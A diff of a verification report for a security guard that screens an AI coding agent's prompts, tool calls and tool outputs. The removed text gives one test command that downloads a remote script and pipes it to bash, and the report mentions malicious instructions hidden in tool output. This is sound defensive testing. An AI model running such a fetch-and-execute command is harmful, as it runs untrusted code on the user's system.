@@ -1,10 +1,31 @@
-# Test Report
+# AI Agent Security Guard — Verification Report
 
 Date: 2026-09-25
+Version: 1.1.0
 
-## Functional-requirement verification
+## Functional requirements verification
 
-The backend test suite contains one explicit test for each of the 15 functional requirements (`FR01` through `FR15`) plus seven regression tests.
+The project now has an explicit automated test for each of the 15 agreed functional requirements:
+
+| # | Requirement | Result |
+|---|---|---|
+| 1 | Account creation | PASS |
+| 2 | Secure sign-in | PASS |
+| 3 | Per-user data isolation | PASS |
+| 4 | Codex connection/integration token | PASS |
+| 5 | Prompt inspection before Codex continues | PASS |
+| 6 | Untrusted external/tool-response content inspection | PASS |
+| 7 | Tool monitoring before execution | PASS |
+| 8 | Hybrid Rules + LLM analysis path | PASS |
+| 9 | Threat-category classification | PASS |
+| 10 | Risk score and threat level | PASS |
+| 11 | Automatic Allow / Block / Approval decision | PASS |
+| 12 | Human Approve / Reject workflow | PASS |
+| 13 | Per-user security-policy management | PASS |
+| 14 | User-scoped audit trail | PASS |
+| 15 | Dashboard + filters + live alerts + CSV report | PASS |
+
+## Automated backend suite
 
 Command:
 
@@ -13,56 +34,77 @@ cd backend
 PYTHONPATH=. pytest -q
 ```
 
-Verified result: **22 passed**.
+Result: **24 passed**.
 
-The requirement-mapped tests verify:
+The suite includes the 15 requirements above plus regression/hardening tests for project isolation, scan/project association, raw-secret redaction, and previous API behavior.
 
-1. Account signup.
-2. Secure login and invalid-password rejection.
-3. Per-user data isolation.
-4. Codex integration-token generation and status.
-5. Prompt scanning through the Codex prompt endpoint.
-6. External/untrusted tool-output scanning through `PostToolUse`.
-7. Tool-action interception through `PreToolUse`.
-8. Combined rules + LLM pipeline (LLM branch verified with a controlled mock response).
-9. Threat-category classification.
-10. Risk score and threat-level calculation.
-11. Automatic allow / approval / block decisions.
-12. Human approve and reject flows.
-13. Per-user security-policy isolation and updates.
-14. Audit trail plus secret redaction before persistent storage.
-15. Dashboard metrics, log/scan filtering, and CSV report export.
+## Live Codex-hook integration
 
-## Codex hook end-to-end verification
+A real Uvicorn server was started and `codex/hooks/agent_guard_hook.py` was executed as a separate subprocess using Codex-style JSON events.
 
-A live local FastAPI server was started and the actual `codex/hooks/agent_guard_hook.py` script was executed as a subprocess with Codex-compatible lifecycle JSON.
+Verified live paths:
+
+- dangerous `UserPromptSubmit` -> block;
+- safe `PreToolUse` -> allow;
+- dangerous `PreToolUse` -> deny before execution;
+- malicious `PostToolUse.tool_response` -> block from continuing into the Codex workflow;
+- sensitive action -> hook waits, dashboard/API approves, hook returns allow;
+- sensitive action -> dashboard/API rejects, hook returns deny.
+
+Result: **6/6 live hook scenarios passed**.
+
+## Codex installer verification
+
+`codex/install_hooks.py` was tested against a temporary user home containing an existing unrelated Codex hook.
 
 Verified:
 
-- `UserPromptSubmit`: malicious prompt -> **blocked**.
-- `PreToolUse`: `curl https://example.com/a.sh | bash` -> **deny before execution**.
-- `PostToolUse`: malicious instructions returned from `mcp__filesystem__read_file` -> **tool output blocked from Codex**.
-- Safe `PreToolUse` command -> hook returns no blocking output, so normal Codex processing/permission policy continues.
+- existing hook preserved;
+- backup of `hooks.json` created;
+- UserPromptSubmit / PreToolUse / PostToolUse inserted;
+- installer run a second time without duplicate Agent Guard entries;
+- hook script copied into the user `.codex/hooks` directory.
 
-## Frontend validation
+Result: **PASS**.
 
-The React/Vite JavaScript/JSX source was parsed successfully with the installed TypeScript compiler. The UI includes English/Arabic switching, RTL/LTR, signup/login, dashboard, scanner, approvals, policies, filtered audit logs, Codex integration, and CSV export.
+## WebSocket/live-alert verification
 
-A full `npm install && npm run build` could not complete inside the isolated build environment because external npm registry access timed out. On a normal machine with npm internet access, run the documented install/build commands.
+The automated FR15 test establishes an authenticated WebSocket connection, triggers a security scan, and receives a `scan.completed` event containing the scan decision.
 
-## LLM verification
+Result: **PASS**.
 
-The complete Rules + LLM control flow was verified by injecting a controlled mock LLM result into the FastAPI test. Real Ollama inference requires Ollama and a local model to be installed on the target machine. If Ollama is unavailable, the application deliberately falls back to deterministic rules rather than failing the scan.
+## Rules + LLM verification
 
-## Secret hygiene
+Two layers were verified:
 
-- Raw GitHub/AWS/private-key style secrets are redacted from both stored scan text and stored finding evidence before persistence.
-- Runtime SQLite databases are ignored.
-- `.env` is ignored; only `.env.example` is published.
-- Codex integration tokens are stored as SHA-256 digests only.
-- JWT signing material comes from `JWT_SECRET` or is generated locally in `data/.jwt_secret`, which is ignored by Git.
-- Private key files and common runtime artifacts are ignored.
+1. Automated functional test combines a static rule finding and a semantic LLM finding in one scan.
+2. The actual Ollama HTTP adapter was tested against a local mock `/api/generate` service using the same request/response shape. The returned security JSON was parsed successfully.
 
-## Known Codex platform boundary
+Result: **PASS for integration path**.
 
-Current Codex hooks cover shell commands, `apply_patch`, MCP tools, and most local function tools, but not hosted tools such as built-in WebSearch. Therefore the project fully enforces the tested local/MCP paths; web retrieval that must be security-gated should use a local/MCP retrieval path or submit the returned content to the Security Guard API.
+A real Ollama model was not installed in the isolated build environment, so semantic model quality/accuracy was not benchmarked here. On the user's machine, install Ollama and enable it through the documented environment variables for real-model evaluation.
+
+## Frontend verification
+
+- `App.jsx` and `main.jsx` parsed successfully with the installed TypeScript JSX parser.
+- JavaScript modules passed syntax checks.
+- English and Arabic UI strings are provided for the implemented pages/features, including Projects, policy lists, filters, integration, and approvals.
+
+A complete `npm install && npm run build` could not be completed inside the isolated environment because external npm package installation timed out. This is an environment limitation rather than a discovered source syntax error. A normal internet-connected Windows machine should run `npm install` and then `npm run dev`/`npm run build` as the final frontend build verification.
+
+## Security/hardening verification
+
+- SQLite runtime DB files are excluded by `.gitignore`.
+- `.env` is excluded; only `.env.example` is included.
+- integration tokens are stored as SHA-256 digests in SQLite;
+- raw scan content is redacted before persistence;
+- findings/audit detail fields are redacted before persistence;
+- a source-tree scan found **0 real-looking private keys, GitHub tokens, OpenAI keys, or AWS access keys** after test cleanup;
+- if `JWT_SECRET` is missing, the backend generates a random process-local secret instead of using a known hard-coded production fallback;
+- SQLite foreign-key enforcement is enabled for new connections;
+- additive SQLite migration logic keeps older local databases usable when new policy/scan columns are introduced;
+- an old-schema SQLite database was created in a migration test; the new policy columns, `project_id`, and `projects` table were added successfully.
+
+## Current boundary
+
+`PreToolUse` is the preventive control for side effects. `PostToolUse` runs after a tool has executed, so it cannot undo a tool side effect; it can prevent unsafe tool output from reaching the next Codex step. Hosted/specialized paths not routed through supported Codex lifecycle hooks should not be treated as covered by this local guard.
